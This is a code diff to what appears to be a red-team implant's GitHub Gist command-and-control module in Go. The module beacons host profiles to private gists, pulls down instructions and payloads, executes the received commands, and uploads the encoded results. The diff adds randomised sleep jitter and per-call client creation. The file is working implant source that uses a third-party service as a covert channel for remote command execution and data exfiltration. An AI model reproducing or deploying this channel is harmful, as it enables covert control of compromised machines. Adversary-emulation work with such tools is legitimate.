@@ -6,9 +6,11 @@ import (
 	"fmt"
 	"github.com/google/go-github/github"
 	"golang.org/x/oauth2"
+	"math/rand"
 	"os"
 	"path/filepath"
 	"strings"
+	"time"
 
 	"../execute"
 	"../output"
@@ -17,25 +19,16 @@ import (
 
 var (
 	token = ""
-	c2Client *github.Client
 	username string
 )
 
 //GIST communicate over github gists
 type GIST struct {}
 
-func init() {
-	ctx := context.Background()
-	ts := oauth2.StaticTokenSource(
-		&oauth2.Token{AccessToken: token},
-	)
-	tc := oauth2.NewClient(ctx, ts)
-	c2Client = github.NewClient(tc)
-}
-
 //Ping tests connectivity to the server
 func (contact GIST) Ping(server string) bool {
 	ctx := context.Background()
+	c2Client := createNewClient()
 	user, _, err := c2Client.Users.Get(ctx, "")
 	if err == nil {
 		username = *user.Login
@@ -48,8 +41,7 @@ func (contact GIST) Ping(server string) bool {
 
 //GetInstructions sends a beacon and returns instructions
 func (contact GIST) GetInstructions(profile map[string]interface{}) map[string]interface{} {
-	ctx := context.Background()
-	bites, heartbeat := gistBeacon(ctx, profile)
+	bites, heartbeat := gistBeacon(profile)
 	var out map[string]interface{}
 	if heartbeat == true {
 		output.VerbosePrint("[+] Beacon: ALIVE")
@@ -68,44 +60,43 @@ func (contact GIST) GetInstructions(profile map[string]interface{}) map[string]i
 
 //DropPayloads downloads all required payloads for a command
 func (contact GIST) DropPayloads(payload string, server string, uniqueId string) []string {
-	ctx := context.Background()
 	payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
 	if len(payloads) > 0 {
-		return gistPayloadDrop(ctx, uniqueId)
+		return gistPayloadDrop(uniqueId)
 	}
 	return []string{}
 }
 
 //RunInstruction runs a single instruction
 func (contact GIST) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
-	ctx := context.Background()
 	cmd, result, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string))
-	gistResults(ctx, profile["paw"].(string), command["id"], result, status, cmd, pid)
+	gistResults(profile["paw"].(string), command["id"], result, status, cmd, pid)
 }
 
-func gistBeacon(ctx context.Context, profile map[string]interface{}) ([]byte, bool) {
-	createHeartbeatGist(ctx, "beacon", profile)
+func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
+	heartbeat := createHeartbeatGist("beacon", profile)
 	//collect instructions & delete
-	contents := getGists(ctx, "instructions", profile["paw"].(string))
+	contents := getGists("instructions", profile["paw"].(string))
 	if contents != nil {
-			return util.Decode(contents[0]), true
+			return util.Decode(contents[0]), heartbeat
 	}
-	return nil, false
+	return nil, heartbeat
 }
 
-func createHeartbeatGist(ctx context.Context, gistType string, profile map[string]interface{}) {
+func createHeartbeatGist(gistType string, profile map[string]interface{}) bool {
 	data, _ := json.Marshal(profile)
-	if createGist(ctx, "beacon", profile["paw"].(string), data).StatusCode != created {
+	if createGist(gistType, profile["paw"].(string), data) != created {
 		output.VerbosePrint("[-] Heartbeat GIST: FAILED")
-	} else {
-		output.VerbosePrint("[+] Heartbeat GIST: SUCCESS")
+		return false
 	}
+	output.VerbosePrint("[+] Heartbeat GIST: SUCCESS")
+	return true
 }
 
-func gistResults(ctx context.Context, uniqueId string, commandID interface{}, result []byte, status string, cmd string, pid string) {
+func gistResults(uniqueId string, commandID interface{}, result []byte, status string, cmd string, pid string) {
 	link := fmt.Sprintf("%s", commandID.(string))
 	data, _ := json.Marshal(map[string]string{"id": link, "output": string(util.Encode(result)), "status": status, "pid": pid})
-	if createGist(ctx, "results", uniqueId, data).StatusCode != created {
+	if createGist("results", uniqueId, data) != created {
 		output.VerbosePrint(fmt.Sprintf("[-] Results %s GIST: FAILED", link))
 	} else {
 		output.VerbosePrint(fmt.Sprintf("[+] Results %s GIST: SUCCESS", link))
@@ -116,9 +107,9 @@ func gistResults(ctx context.Context, uniqueId string, commandID interface{}, re
 	}
 }
 
-func gistPayloadDrop(ctx context.Context, uniqueId string) []string {
+func gistPayloadDrop(uniqueId string) []string {
 	var droppedPayloads []string
-	payloads := getGists(ctx, "payloads", uniqueId)
+	payloads := getGists("payloads", uniqueId)
 	for _, payload := range payloads {
 		output.VerbosePrint(fmt.Sprintf("[*] Downloaded new payload: %s", payload))
 		location := filepath.Join(payload)
@@ -130,7 +121,9 @@ func gistPayloadDrop(ctx context.Context, uniqueId string) []string {
 	return droppedPayloads
 }
 
-func createGist(ctx context.Context, gistType string, uniqueId string, data []byte) *github.Response {
+func createGist(gistType string, uniqueId string, data []byte) int {
+	ctx := context.Background()
+	c2Client := createNewClient()
 	gistDescriptor := getGistDescriptor(gistType, uniqueId)
 	stringified := string(util.Encode(data))
 	file := github.GistFile{Content: &stringified,}
@@ -138,11 +131,19 @@ func createGist(ctx context.Context, gistType string, uniqueId string, data []by
 	files[github.GistFilename(gistDescriptor)] = file
 	public := false
 	gist := github.Gist{Description: &gistDescriptor, Public: &public, Files: files,}
-	_, resp, _ := c2Client.Gists.Create(ctx, &gist)
-	return resp
+	_, resp, err := c2Client.Gists.Create(ctx, &gist)
+	time.Sleep(time.Duration(rand.Intn(10))*time.Second)
+	if err != nil {
+		output.VerbosePrint(fmt.Sprintf("%s", err))
+		return 500
+	}
+	status := resp.StatusCode
+	return status
 }
 
-func getGists(ctx context.Context, gistType string, uniqueID string) []string {
+func getGists(gistType string, uniqueID string) []string {
+	ctx := context.Background()
+	c2Client := createNewClient()
 	var contents []string
 	gists, _, err := c2Client.Gists.List(ctx, username, nil)
 	if err == nil {
@@ -164,3 +165,17 @@ func getGists(ctx context.Context, gistType string, uniqueID string) []string {
 func getGistDescriptor(gistType string, uniqueId string) string {
 	return fmt.Sprintf("%s-%s", gistType, uniqueId)
 }
+
+func createNewClient() *github.Client {
+	ctx := context.Background()
+	ts := oauth2.StaticTokenSource(
+		&oauth2.Token{AccessToken: token},
+	)
+	tc := oauth2.NewClient(ctx, ts)
+	tc.Timeout = 5 * time.Second
+	tc.CloseIdleConnections()
+	c2Client := github.NewClient(tc)
+	return c2Client
+}
+
+
